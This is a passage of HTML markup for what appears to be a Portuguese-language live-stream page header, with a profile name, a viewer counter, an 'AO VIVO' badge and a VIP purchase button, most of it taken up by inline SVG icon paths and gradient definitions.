            <img src="../logo.gif" alt="Logo" class="small-logo">
            <div class="profile-info">
                <img src="/menu/foto5.svg" alt="@FERNANDAVICKY" class="profile-pic">
                <div class="profile-text">
                    <div class="profile-name">FERNANDA</div>
                    <div class="viewers-count">
                        <i class="fas fa-eye"></i> <span id="vip-counter">12</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="header-actions">
            <div class="live-indicator">
                <svg width="60" height="24" viewBox="0 0 60 24">
                    <rect width="60" height="24" rx="4" fill="#cc0000"></rect>
                    <text x="30" y="16" text-anchor="middle" fill="white" font-size="12" font-weight="bold">AO VIVO</text>
                </svg>
            </div>
            <button class="vip-button" id="buyVipButton" style="display: flex; align-items: center; gap: 6px;">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="35" height="35">
        <<path d="M16.2058 3.04541C16.2058 3.04541 14.0344 3.97684 13.8516 6.49113C13.7144 8.34827 16.1373 7.58256 16.1373 7.58256C16.1373 7.58256 17.0916 4.64541 16.2058 3.04541Z" fill="url(#paint0_radial)"/>
<path d="M15.28 6.22255C15.28 7.30827 15.6743 7.65112 16.1886 7.38255C16.3829 6.70255 16.9486 4.3997 16.2 3.04541C16.2057 3.04541 15.28 4.13112 15.28 6.22255Z" fill="url(#paint1_radial)"/>
<path d="M13.6058 4.61139C16.1258 3.90853 17.6058 6.50282 16.5544 8.08568C16.5544 8.08568 16.2629 6.86282 15.4515 6.46282C14.6401 6.06282 13.6687 6.73139 13.6687 6.73139L12.8115 5.86853L13.6058 4.61139Z" fill="url(#paint2_radial)"/>
<path d="M14.023 16.3824C14.023 16.3824 13.423 18.6567 13.423 19.7481C13.423 20.8396 12.8802 21.931 11.8802 22.1367C10.8802 22.3424 5.10875 22.571 3.65161 19.2967L3.72018 18.1139L9.01733 5.36529C14.1316 3.66243 17.8459 7.61672 19.4688 11.6796C20.6573 14.6624 23.6802 15.6624 22.1088 18.4567C20.783 20.8224 17.8802 21.0453 16.3145 17.9139C15.743 16.7824 14.9316 16.4967 14.023 16.3824Z" fill="url(#paint3_radial)"/>
<path opacity="0.75" d="M14.023 16.3824C14.023 16.3824 13.423 18.6567 13.423 19.7481C13.423 20.8396 12.8802 21.931 11.8802 22.1367C10.8802 22.3424 5.10875 22.571 3.65161 19.2967L3.72018 18.1139L9.01733 5.36529C14.1316 3.66243 17.8459 7.61672 19.4688 11.6796C20.6573 14.6624 23.6802 15.6624 22.1088 18.4567C20.783 20.8224 17.8802 21.0453 16.3145 17.9139C15.743 16.7824 14.9316 16.4967 14.023 16.3824Z" fill="url(#paint4_radial)"/>
<path opacity="0.75" d="M14.023 16.3824C14.023 16.3824 13.423 18.6567 13.423 19.7481C13.423 20.8396 12.8802 21.931 11.8802 22.1367C10.8802 22.3424 5.10875 22.571 3.65161 19.2967L3.72018 18.1139L9.01733 5.36529C14.1316 3.66243 17.8459 7.61672 19.4688 11.6796C20.6573 14.6624 23.6802 15.6624 22.1088 18.4567C20.783 20.8224 17.8802 21.0453 16.3145 17.9139C15.743 16.7824 14.9316 16.4967 14.023 16.3824Z" fill="url(#paint5_radial)"/>
<path d="M13.5599 5.47949C16.2799 6.07949 15.8742 8.45092 14.4227 9.26235C14.4056 9.27378 14.3885 9.25664 14.3942 9.23949C14.4456 9.02235 14.6342 8.10235 14.2456 7.51378C13.7999 6.83949 12.7656 6.94235 12.7656 6.94235L12.4856 5.87949L13.5599 5.47949Z" fill="url(#paint6_radial)"/>
<path d="M12.8345 5.09717L11.9716 5.42288C7.69161 7.0286 4.61732 10.8457 3.98875 15.3715C3.74875 17.0972 3.67447 18.5086 3.65161 19.0515C3.9259 18.8915 4.22304 18.8972 4.49733 19.2629C5.28018 20.3315 5.82875 20.2629 5.46304 19.8972C5.09732 19.5315 4.87447 18.1943 5.18875 17.9886C5.50304 17.7829 6.25732 16.9657 6.75447 16.0343C7.25161 15.1029 6.91447 13.5772 7.18875 13.5143C9.35447 13 9.83447 10.5486 9.94875 10.4915C11.4116 9.74288 11.8116 7.76003 11.8859 7.58288L13.8459 5.38288C13.5202 5.2686 13.183 5.17145 12.8345 5.09717Z" fill="url(#paint7_radial)"/>
<path d="M22.1028 18.4508C20.7771 20.8165 17.8742 21.0394 16.3085 17.908C15.7485 16.7823 14.9371 16.4965 14.0228 16.388V16.3994C12.5428 16.2223 10.7714 16.4508 9.25709 14.1423C9.25709 14.1423 8.21709 12.7651 10.4914 12.7251C13.2285 12.6794 13.1142 14.2223 14.1028 14.5651C15.7714 15.1365 17.3199 15.1137 17.7999 16.3651C18.2742 17.6108 22.1028 18.4508 22.1028 18.4508Z" fill="url(#paint8_radial)"/>
<path d="M6.14291 13.4227C6.65149 15.8799 5.35434 19.3256 1.52577 18.5884C1.4172 18.5656 1.38863 18.4399 1.48577 18.4056C2.2172 18.1541 3.2172 17.0741 3.45149 14.0513C3.60006 12.1884 4.67434 12.3027 6.25149 12.5427C7.82863 12.7827 6.14291 13.4227 6.14291 13.4227Z" fill="url(#paint9_linear)"/>
<path d="M6.28585 12.8623L4.03442 14.6166L3.35442 14.9366C3.23442 15.7309 3.06299 16.3594 2.85156 16.8509C3.05728 17.3937 3.44013 17.9194 4.04013 18.388C4.42299 18.2223 4.7487 17.9937 5.0287 17.7194C5.01156 17.668 5.00013 17.6394 5.00013 17.6394L5.13728 17.6052C5.27442 17.4566 5.40013 17.2909 5.51442 17.1194C5.52585 16.4223 5.6287 14.9994 6.25156 14.4909C6.25156 14.1252 6.21727 13.7594 6.1487 13.4166C6.1487 13.4166 6.40585 13.3194 6.62299 13.188C6.45156 12.9994 6.28585 12.8623 6.28585 12.8623Z" fill="url(#paint10_linear)"/>
<path d="M13.3143 5.86272C13.88 5.63986 13.9486 5.02844 13.3771 4.81701C10.72 3.83415 8.4 5.14844 7.48571 7.04558C5.54286 11.0684 3.32571 11.2113 3.23428 14.9256C3.16571 17.7827 5.01143 19.5541 5.30857 19.6684C5.66857 19.8056 5.05714 18.3599 5.23428 15.7656C5.38286 13.657 7.30286 13.0341 7.78286 12.3656C8.26286 11.697 10.3486 7.02272 10.3486 7.02272L13.3143 5.86272Z" fill="url(#paint11_linear)"/>
<path d="M4.61144 16.4285C2.94286 11.9028 7.90858 10.52 8.10286 7.90855C8.33715 4.81712 11.6629 4.82283 13.3714 4.82283C10.7143 3.83998 8.22286 4.97712 7.30286 6.87426C5.36001 10.8971 3.32001 11.2171 3.22858 14.9314C3.16001 17.7885 5.10286 19.6171 5.30286 19.6743C5.30858 19.6685 5.85715 19.8057 4.61144 16.4285Z" fill="url(#paint12_linear)"/>
<path d="M13.3143 5.8627C12.4571 4.52556 11.08 5.7427 9.75999 6.95413C9.35999 7.32556 8.67427 7.15985 8.58284 7.70842C8.29141 7.55413 8.02284 7.32556 7.82284 7.0627C7.71999 6.92556 7.45141 7.79985 8.2857 8.5427C8.38284 8.62842 8.42856 8.75985 8.4057 8.88556C8.31999 9.37127 8.18284 9.88556 7.90284 10.417C7.46284 10.4341 7.05713 10.337 6.79999 10.2513C6.70856 10.2227 6.63999 10.3256 6.69713 10.3998C6.85141 10.5998 7.03427 10.7884 7.14284 10.9027C7.21141 10.9713 7.23427 11.0741 7.19427 11.1656C7.03999 11.5084 6.73713 11.9141 6.34284 12.2284C5.87427 12.5998 5.50856 12.9941 5.22856 13.4056C5.0457 13.3884 4.87999 13.3713 4.74856 13.3484C4.61713 13.3313 4.53713 13.417 4.61713 13.4913C4.70284 13.5713 4.79999 13.6398 4.89141 13.7084C4.94856 13.7484 4.97141 13.8284 4.93713 13.8913C4.07427 15.5998 4.25141 17.9541 5.41713 19.2113C5.23427 18.1141 5.14856 17.0284 5.23427 15.7713C5.27999 15.1141 5.49713 14.6056 5.78856 14.1941C6.0057 13.8856 6.26284 13.6341 6.5257 13.4113C7.03999 12.977 7.5657 12.6798 7.78284 12.3713C7.87427 12.2456 8.02284 11.977 8.19999 11.617C8.41141 11.1998 8.66856 10.6684 8.93141 10.1141C9.0857 9.79413 9.23427 9.4627 9.38284 9.1427C9.6457 8.57127 9.89141 8.03985 10.0628 7.65127C10.2343 7.26842 10.3428 7.02842 10.3428 7.02842L13.3143 5.8627Z" fill="url(#paint13_linear)"/>
<path d="M17.4228 17.1425C16.7828 17.9425 16.88 19.1025 17.7028 19.7082C19.24 20.8453 21.1085 20.2739 22.1028 18.5025C22.5599 17.6853 22.6514 17.0167 22.5142 16.411C22.4285 16.0339 21.9771 15.3139 21.9485 15.3139C21.1885 15.1939 21.0057 15.6796 20.5714 15.7596C20.0742 15.851 19.76 15.6167 18.76 15.891C17.76 16.1653 17.6914 16.6796 17.5085 17.011C17.48 17.0625 17.4514 17.1025 17.4228 17.1425Z" fill="url(#paint14_radial)"/>
<path d="M19.4345 17.754C19.3202 17.354 19.7659 17.1026 19.4802 16.9997C19.1945 16.8969 18.8459 17.1254 18.703 17.514C18.5602 17.9026 18.6802 18.3026 18.9716 18.4054C19.2573 18.5083 19.543 18.1311 19.4345 17.754Z" fill="url(#paint15_radial)"/>
<path d="M17.8514 18.4625C17.6457 18.2053 17.44 18.9425 17.8743 18.9996C18.28 19.051 18.72 20.1025 20.9429 19.8053C21.1086 19.691 21.2629 19.5653 21.4114 19.4167C21.3657 19.4339 19.3086 20.2796 17.8514 18.4625Z" fill="url(#paint16_linear)"/>
<path opacity="0.5" d="M14.0228 16.3996C12.5428 16.2168 10.7714 16.4454 9.25711 14.1368C9.13711 13.9539 8.85711 14.0854 8.91996 14.2911C9.03996 14.6968 9.26853 15.1825 9.72568 15.6568C11.6742 17.6854 13.3085 17.1539 12.88 19.6739C12.5942 21.3596 11.1371 22.2854 11.88 22.1311C12.88 21.9254 13.4228 20.8339 13.4228 19.7425C13.4171 18.7082 14.0285 16.6111 14.0228 16.3996Z" fill="url(#paint17_radial)"/>
<path d="M13.4915 10.9937C13.2744 11.5308 13.5258 12.308 14.223 12.228C14.6458 12.1823 14.8858 11.9137 14.9315 11.508C14.983 11.0623 14.7887 10.5937 14.4344 10.4565C14.0801 10.3194 13.663 10.5651 13.4915 10.9937Z" fill="url(#paint18_radial)"/>
<path d="M13.4915 10.9937C13.3258 11.428 13.4801 11.8851 13.8401 12.0223C14.1944 12.1594 14.6173 11.9194 14.783 11.4851C14.9487 11.0508 14.7944 10.5937 14.4344 10.4566C14.0801 10.3194 13.6573 10.5594 13.4915 10.9937Z" fill="url(#paint19_radial)"/>
<path d="M13.9087 10.8336C13.8572 10.9707 13.903 11.1193 14.0173 11.1593C14.1315 11.1993 14.263 11.125 14.3144 10.9879C14.3658 10.8507 14.3201 10.7022 14.2058 10.6622C14.0973 10.6222 13.9601 10.6964 13.9087 10.8336Z" fill="url(#paint20_linear)"/>
<path d="M9.58859 9.91406C9.74288 12.5198 6.97716 14.4683 4.56002 13.4626C4.46288 13.4226 4.49145 13.3198 4.61716 13.2798C5.18859 13.0969 6.36002 12.6569 6.91431 11.9941C7.66288 11.0969 7.40573 10.3312 7.40573 10.3312L8.21716 10.5541L9.58859 9.91406Z" fill="url(#paint21_linear)"/>
<path d="M8.58308 10.4114C8.57736 10.4057 8.57165 10.3943 8.56593 10.3885L8.22308 10.5485L7.41165 10.3257C7.41165 10.3257 7.66879 11.0914 6.92022 11.9885C6.36593 12.6514 5.18879 13.0914 4.62307 13.2743C4.54879 13.2971 4.50879 13.3485 4.50879 13.3885C5.38879 13.6 6.52022 13.4228 7.16022 13.1314C8.26308 12.6343 9.16593 11.2114 8.58308 10.4114Z" fill="url(#paint22_linear)"/>
<path d="M7.40578 10.3255C7.40578 10.3255 7.54293 10.7426 7.32007 11.3198C8.09721 11.5255 9.0915 11.1655 9.50292 10.8455C9.57721 10.5541 9.60578 10.2398 9.58864 9.91406L8.21721 10.5426L7.40578 10.3255Z" fill="url(#paint23_linear)"/>
<path d="M16.5315 8.16544L16.303 8.65115C16.303 8.65115 17.2458 9.09115 17.743 8.73115C18.2401 8.37115 17.2058 7.93115 17.2058 7.93115L16.5315 8.16544Z" fill="url(#paint24_radial)"/>
<path d="M11.6685 7.33106C10.4856 9.65105 9.58275 11.7653 6.7256 10.2568C6.6456 10.2168 6.66846 10.0853 6.75418 10.0796C7.43418 10.0053 8.98275 9.64534 9.01703 7.84534C9.05132 6.09106 11.4685 5.12534 12.6742 5.69106C13.8799 6.25677 11.6685 7.33106 11.6685 7.33106Z" fill="url(#paint25_linear)"/>
<path d="M6.7256 10.2568C9.58275 11.7711 10.4856 9.65111 11.6685 7.33111C11.6685 7.33111 12.5885 6.87968 12.9142 6.41111C12.3199 6.31397 11.6685 6.65111 11.097 7.97111C9.63989 11.3368 7.03989 10.2225 6.75418 10.0797C6.66846 10.0854 6.6456 10.2168 6.7256 10.2568Z" fill="url(#paint26_linear)"/>
<path d="M22.5143 16.4171C22.4857 16.4 22.4571 16.3885 22.4229 16.3828C22.2343 16.4342 22.2343 16.7428 22.3371 16.8971C22.44 17.0514 22.1314 17.3714 22.4229 17.5885C22.4514 17.5714 22.4743 17.5542 22.4914 17.5371C22.5943 17.1371 22.5886 16.7657 22.5143 16.4171Z" fill="url(#paint27_radial)"/>
<path d="M19.9602 4.31959L21.0345 2.8853C20.8574 2.66816 20.7088 2.46816 20.5888 2.29102L19.2459 3.2853L19.0859 3.7653L19.9602 4.31959Z" fill="url(#paint28_linear)"/>
<path d="M16.783 8.58839L17.4173 7.73696C16.3602 6.91982 16.0173 6.13696 15.9144 5.74268L14.9202 6.47982C14.8402 6.53696 14.8059 6.63982 14.8287 6.73125C14.943 7.15982 15.3544 8.48553 16.543 8.68553C16.6344 8.69125 16.7259 8.65696 16.783 8.58839Z" fill="url(#paint29_linear)"/>
<path d="M17.4171 7.73144L18.2057 6.6743C17.5428 6.12573 17.1714 5.40001 16.9943 4.94287L15.92 5.73716C15.9143 6.3543 16.4457 7.24573 17.4171 7.73144Z" fill="url(#paint30_linear)"/>
<path d="M19.1143 5.45107L19.96 4.31393C19.5486 3.98821 19.3029 3.55964 19.24 3.27393L18.16 4.07393L17.9714 5.33678L19.1143 5.45107Z" fill="url(#paint31_linear)"/>
<path d="M18.2058 6.67373L19.1144 5.45087C18.5144 5.04516 18.2115 4.46802 18.1601 4.07373L16.9944 4.93659C17.0172 5.4223 17.4344 6.12516 18.2058 6.67373Z" fill="url(#paint32_linear)"/>
<path d="M20.2458 2.5369C20.2458 2.73119 20.4973 3.05119 20.7487 3.26261L20.9201 3.02833L21.623 2.08547C21.6916 1.99404 21.6859 1.87404 21.6116 1.78833C21.5316 1.6969 21.3944 1.68547 21.2973 1.75404L20.2458 2.5369Z" fill="url(#paint33_linear)"/>
<path opacity="0.48" d="M21.6115 1.79419C21.5315 1.70276 21.3943 1.69133 21.2972 1.7599L14.9258 6.47419C14.8458 6.53133 14.8115 6.63419 14.8343 6.72562C14.9486 7.15419 15.3601 8.4799 16.5486 8.6799C16.6343 8.69705 16.7258 8.66276 16.7829 8.58847L21.6229 2.09133C21.6915 1.9999 21.6858 1.87419 21.6115 1.79419Z" fill="url(#paint34_radial)"/>
<path opacity="0.75" d="M21.6115 1.79419C21.5315 1.70276 21.3943 1.69133 21.2972 1.7599L14.9258 6.47419C14.8458 6.53133 14.8115 6.63419 14.8343 6.72562C14.9486 7.15419 15.3601 8.4799 16.5486 8.6799C16.6343 8.69705 16.7258 8.66276 16.7829 8.58847L21.6229 2.09133C21.6915 1.9999 21.6858 1.87419 21.6115 1.79419Z" fill="url(#paint35_radial)"/>
<path d="M14.8344 6.72545C14.9087 6.99973 15.103 7.63402 15.5372 8.11402C16.3601 7.38259 15.9315 6.37688 15.4458 6.08545L14.9201 6.47402C14.8458 6.53116 14.8115 6.62831 14.8344 6.72545Z" fill="url(#paint36_linear)"/>
<path d="M13.5828 5.08545C16.3028 5.68545 15.8971 8.05688 14.4457 8.86831C14.4285 8.87974 14.4114 8.86259 14.4171 8.84545C14.4685 8.62831 14.6571 7.70831 14.2685 7.11974C13.8228 6.44545 12.7885 6.54831 12.7885 6.54831L12.5085 5.48545L13.5828 5.08545Z" fill="url(#paint37_radial)"/>
<path d="M11.6288 7.41086C11.1088 7.23943 10.4516 7.13086 10.4516 7.13086L9.08022 7.39943C9.04022 7.54229 9.02308 7.68514 9.01736 7.83943C9.01165 8.11371 8.97165 8.35943 8.90308 8.57086C9.50308 8.76514 10.3545 8.67371 11.0916 8.45657C11.2688 8.12514 11.4459 7.77086 11.6288 7.41086Z" fill="url(#paint38_linear)"/>
<path d="M12.48 4.4624C11.44 4.54812 10.6914 5.65669 10.2 6.49669C9.70853 7.33669 8.62853 7.28526 7.87425 6.84526C7.69139 6.73669 7.86853 8.1424 9.77139 8.17669C11.5314 8.21097 12.0857 7.23383 12.1142 6.11954C12.1371 5.01097 12.48 4.4624 12.48 4.4624Z" fill="url(#paint39_radial)"/>
<path d="M10.4743 7.74826C9.50286 7.99969 8.54858 7.7254 7.81715 6.89111C7.78858 7.14254 8.16572 8.14254 9.76572 8.17683C11.5257 8.21111 12.08 7.23397 12.1086 6.11968C12.12 5.57683 12.2114 5.17111 12.2972 4.89111C11.24 5.46826 11.5029 7.4854 10.4743 7.74826Z" fill="url(#paint40_linear)"/>
<path d="M13.3086 2.85107C13.3086 2.85107 11.3772 3.72536 11.6401 7.17108C11.6629 7.47393 11.7486 7.68536 11.8744 7.82822C12.4401 8.47965 13.8229 7.66822 13.8229 7.66822C13.8229 7.66822 14.4629 5.79965 13.3086 2.85107Z" fill="url(#paint41_radial)"/>
<path d="M13.0801 7.32536C13.3715 7.35965 13.5144 7.2625 13.623 7.11965C13.7315 6.9825 13.7887 6.81679 13.8058 6.64536C13.8972 5.83393 13.9772 4.57107 13.3087 2.85107C12.0915 4.65107 11.623 7.16536 13.0801 7.32536Z" fill="url(#paint42_radial)"/>
<defs>
<radialGradient id="paint0_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(15.5034 5.92308) scale(4.41343)">
<stop stop-color="white"/>
<stop offset="1" stop-color="#E0DBEC"/>
</radialGradient>
<radialGradient id="paint1_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(16.6238 4.63123) rotate(110.555) scale(4.65994 2.20226)">
<stop stop-color="#FC5B54" stop-opacity="0"/>
<stop offset="0.12" stop-color="#EB4E65" stop-opacity="0.12"/>
<stop offset="0.5274" stop-color="#B6249A" stop-opacity="0.5274"/>
<stop offset="0.8331" stop-color="#950ABB" stop-opacity="0.8331"/>
<stop offset="1" stop-color="#8800C7"/>
</radialGradient>
<radialGradient id="paint2_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(12.1124 2.07515) scale(4.45823)">
<stop stop-color="#BB62AD"/>
<stop offset="0.2371" stop-color="#B95FAE"/>
<stop offset="0.4317" stop-color="#B455B1"/>
<stop offset="0.6112" stop-color="#AB43B5"/>
<stop offset="0.7816" stop-color="#9F2BBC"/>
<stop offset="0.9442" stop-color="#8E0CC4"/>
<stop offset="1" stop-color="#8800C7"/>
</radialGradient>
<radialGradient id="paint3_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(11.245 12.737) rotate(52.014) scale(15.6671 15.5176)">
<stop stop-color="white"/>
<stop offset="0.3621" stop-color="#FCFCFD"/>
<stop offset="0.659" stop-color="#F3F2F8"/>
<stop offset="0.9322" stop-color="#E5E1EF"/>
<stop offset="1" stop-color="#E0DBEC"/>
</radialGradient>
<radialGradient id="paint4_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(20.711 11.8585) rotate(52.014) scale(15.6816 3.11134)">
<stop stop-color="#D1F2FF" stop-opacity="0.4"/>
<stop offset="0.4739" stop-color="#BFEDFF" stop-opacity="0.2105"/>
<stop offset="1" stop-color="#B0E9FF" stop-opacity="0"/>
</radialGradient>
<radialGradient id="paint5_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(13.7117 25.402) scale(9.9537)">
<stop stop-color="#EF708C" stop-opacity="0.4"/>
<stop offset="1" stop-color="#EF708C" stop-opacity="0"/>
</radialGradient>
<radialGradient id="paint6_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(17.2084 7.14826) scale(3.78011)">
<stop stop-color="#D098C5"/>
<stop offset="0.2785" stop-color="#D19BC7" stop-opacity="0.8608"/>
<stop offset="0.5069" stop-color="#D3A5CD" stop-opacity="0.7465"/>
<stop offset="0.7177" stop-color="#D7B7D7" stop-opacity="0.6412"/>
<stop offset="0.9166" stop-color="#DDCFE5" stop-opacity="0.5417"/>
<stop offset="1" stop-color="#E0DBEC" stop-opacity="0.5"/>
</radialGradient>
<radialGradient id="paint7_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(6.76039 10.7568) rotate(120.768) scale(17.0605 4.21501)">
<stop stop-color="#D098C5"/>
<stop offset="0.2785" stop-color="#D19BC7" stop-opacity="0.8608"/>
<stop offset="0.5069" stop-color="#D3A5CD" stop-opacity="0.7465"/>
<stop offset="0.7177" stop-color="#D7B7D7" stop-opacity="0.6412"/>
<stop offset="0.9166" stop-color="#DDCFE5" stop-opacity="0.5417"/>
<stop offset="1" stop-color="#E0DBEC" stop-opacity="0.5"/>
</radialGradient>
<radialGradient id="paint8_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(12.39 14.7158) rotate(108.578) scale(2.54736 7.26566)">
<stop stop-color="#F9F9FC" stop-opacity="0"/>
<stop offset="0.3911" stop-color="#F6F6FA" stop-opacity="0.3911"/>
<stop offset="0.7115" stop-color="#EEECF5" stop-opacity="0.7115"/>
<stop offset="1" stop-color="#E0DBEC"/>
</radialGradient>
<linearGradient id="paint9_linear" x1="8.99318" y1="19.472" x2="2.87989" y2="14.6313" gradientUnits="userSpaceOnUse">
<stop/>
<stop offset="1" stop-color="#8800C7"/>
</linearGradient>
<linearGradient id="paint10_linear" x1="1.31305" y1="10.3374" x2="6.273" y2="17.2574" gradientUnits="userSpaceOnUse">
<stop/>
<stop offset="1" stop-opacity="0"/>
</linearGradient>
<linearGradient id="paint11_linear" x1="-0.723762" y1="2.36241" x2="8.85204" y2="11.7529" gradientUnits="userSpaceOnUse">
<stop stop-color="#BB62AD"/>
<stop offset="0.2802" stop-color="#A94BAB"/>
<stop offset="0.8671" stop-color="#7B0FA4"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<linearGradient id="paint12_linear" x1="1.04499" y1="-5.29625" x2="11.2092" y2="16.9869" gradientUnits="userSpaceOnUse">
<stop stop-color="#BB62AD"/>
<stop offset="0.2802" stop-color="#A94BAB"/>
<stop offset="0.8671" stop-color="#7B0FA4"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<linearGradient id="paint13_linear" x1="40.1218" y1="12.5914" x2="-0.743871" y2="12.1423" gradientUnits="userSpaceOnUse">
<stop/>
<stop offset="1" stop-opacity="0"/>
</linearGradient>
<radialGradient id="paint14_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(21.214 15.1539) scale(4.81174)">
<stop stop-color="#BB62AD"/>
<stop offset="0.2371" stop-color="#B95FAD"/>
<stop offset="0.4317" stop-color="#B155AC"/>
<stop offset="0.6112" stop-color="#A443AA"/>
<stop offset="0.7816" stop-color="#912BA7"/>
<stop offset="0.9442" stop-color="#7A0CA4"/>
<stop offset="1" stop-color="#7000A3"/>
</radialGradient>
<radialGradient id="paint15_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(19.0103 18.2104) rotate(-70.4218) scale(2.33816 1.42417)">
<stop stop-color="#7000A3"/>
<stop offset="1"/>
</radialGradient>
<linearGradient id="paint16_linear" x1="19.5781" y1="18.1446" x2="19.3916" y2="20.86" gradientUnits="userSpaceOnUse">
<stop stop-color="#391838"/>
<stop offset="0.2285" stop-color="#3B173B"/>
<stop offset="0.4159" stop-color="#401545"/>
<stop offset="0.5889" stop-color="#491157"/>
<stop offset="0.7532" stop-color="#550C6F"/>
<stop offset="0.9098" stop-color="#65058E"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<radialGradient id="paint17_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(16.0402 18.335) scale(9.37209)">
<stop stop-color="#D098C5"/>
<stop offset="0.2785" stop-color="#D19BC7" stop-opacity="0.7215"/>
<stop offset="0.5069" stop-color="#D3A5CD" stop-opacity="0.4931"/>
<stop offset="0.7177" stop-color="#D7B7D7" stop-opacity="0.2823"/>
<stop offset="0.9166" stop-color="#DDCFE5" stop-opacity="0.0834284"/>
<stop offset="1" stop-color="#E0DBEC" stop-opacity="0"/>
</radialGradient>
<radialGradient id="paint18_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(14.3226 11.1274) rotate(112.325) scale(0.908211 0.754455)">
<stop stop-color="#D098C5"/>
<stop offset="0.2785" stop-color="#D19BC7" stop-opacity="0.8608"/>
<stop offset="0.5069" stop-color="#D3A5CD" stop-opacity="0.7465"/>
<stop offset="0.7177" stop-color="#D7B7D7" stop-opacity="0.6412"/>
<stop offset="0.9166" stop-color="#DDCFE5" stop-opacity="0.5417"/>
<stop offset="1" stop-color="#E0DBEC" stop-opacity="0.5"/>
</radialGradient>
<radialGradient id="paint19_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(14.2517 11.0446) rotate(112.325) scale(0.826137 0.686272)">
<stop stop-color="#512D00"/>
<stop offset="1"/>
</radialGradient>
<linearGradient id="paint20_linear" x1="13.4459" y1="12.8185" x2="13.9239" y2="11.4536" gradientUnits="userSpaceOnUse">
<stop/>
<stop offset="1" stop-color="#512D00"/>
</linearGradient>
<linearGradient id="paint21_linear" x1="7.64411" y1="6.997" x2="7.12141" y2="11.2695" gradientUnits="userSpaceOnUse">
<stop stop-color="#BB62AD"/>
<stop offset="0.2802" stop-color="#A94BAB"/>
<stop offset="0.8671" stop-color="#7B0FA4"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<linearGradient id="paint22_linear" x1="8.90894" y1="13.9567" x2="5.483" y2="10.9739" gradientUnits="userSpaceOnUse">
<stop stop-color="#BB62AD"/>
<stop offset="0.2802" stop-color="#A94BAB"/>
<stop offset="0.8671" stop-color="#7B0FA4"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<linearGradient id="paint23_linear" x1="10.7007" y1="7.56768" x2="7.37947" y2="12.0336" gradientUnits="userSpaceOnUse">
<stop/>
<stop offset="1" stop-opacity="0"/>
</linearGradient>
<radialGradient id="paint24_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(16.3583 8.53563) rotate(-4.40726) scale(1.36371)">
<stop stop-color="#D098C5"/>
<stop offset="0.2785" stop-color="#D19BC7" stop-opacity="0.7215"/>
<stop offset="0.5069" stop-color="#D3A5CD" stop-opacity="0.4931"/>
<stop offset="0.7177" stop-color="#D7B7D7" stop-opacity="0.2823"/>
<stop offset="0.9166" stop-color="#DDCFE5" stop-opacity="0.0834284"/>
<stop offset="1" stop-color="#E0DBEC" stop-opacity="0"/>
</radialGradient>
<linearGradient id="paint25_linear" x1="3.20412" y1="12.5262" x2="9.01808" y2="8.78108" gradientUnits="userSpaceOnUse">
<stop stop-color="#BB62AD"/>
<stop offset="0.2371" stop-color="#B95FAD"/>
<stop offset="0.4317" stop-color="#B155AC"/>
<stop offset="0.6112" stop-color="#A443AA"/>
<stop offset="0.7816" stop-color="#912BA7"/>
<stop offset="0.9442" stop-color="#7A0CA4"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<linearGradient id="paint26_linear" x1="4.02313" y1="0.543588" x2="9.95461" y2="8.5204" gradientUnits="userSpaceOnUse">
<stop stop-color="#BB62AD"/>
<stop offset="0.2371" stop-color="#B95FAD"/>
<stop offset="0.4317" stop-color="#B155AC"/>
<stop offset="0.6112" stop-color="#A443AA"/>
<stop offset="0.7816" stop-color="#912BA7"/>
<stop offset="0.9442" stop-color="#7A0CA4"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<radialGradient id="paint27_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(22.623 17.1314) scale(1.19965)">
<stop stop-color="#7000A3"/>
<stop offset="1"/>
</radialGradient>
<linearGradient id="paint28_linear" x1="20.7433" y1="4.94973" x2="19.9433" y2="3.0416" gradientUnits="userSpaceOnUse">
<stop stop-color="#F05C00"/>
<stop offset="0.5926" stop-color="#FA7A00"/>
<stop offset="0.9987" stop-color="#FF8900"/>
</linearGradient>
<linearGradient id="paint29_linear" x1="15.9213" y1="6.95677" x2="17.1062" y2="9.19085" gradientUnits="userSpaceOnUse">
<stop offset="0.00268665" stop-color="#7000A3"/>
<stop offset="0.7988" stop-color="#9500DA"/>
<stop offset="0.9934" stop-color="#9F00E8"/>
</linearGradient>
<linearGradient id="paint30_linear" x1="17.4206" y1="8.12134" x2="16.8821" y2="5.33602" gradientUnits="userSpaceOnUse">
<stop offset="0.00662825" stop-color="#3640FF"/>
<stop offset="0.1428" stop-color="#2657F8"/>
<stop offset="0.4841" stop-color="#008EE6"/>
<stop offset="0.7886" stop-color="#0FACF6"/>
<stop offset="0.9973" stop-color="#17BBFE"/>
</linearGradient>
<linearGradient id="paint31_linear" x1="19.2263" y1="6.4943" x2="18.8436" y2="4.03854" gradientUnits="userSpaceOnUse">
<stop stop-color="#FFBF00"/>
<stop offset="0.00802441" stop-color="#FFBF01"/>
<stop offset="0.6596" stop-color="#FDCA29"/>
<stop offset="0.9973" stop-color="#FCCE38"/>
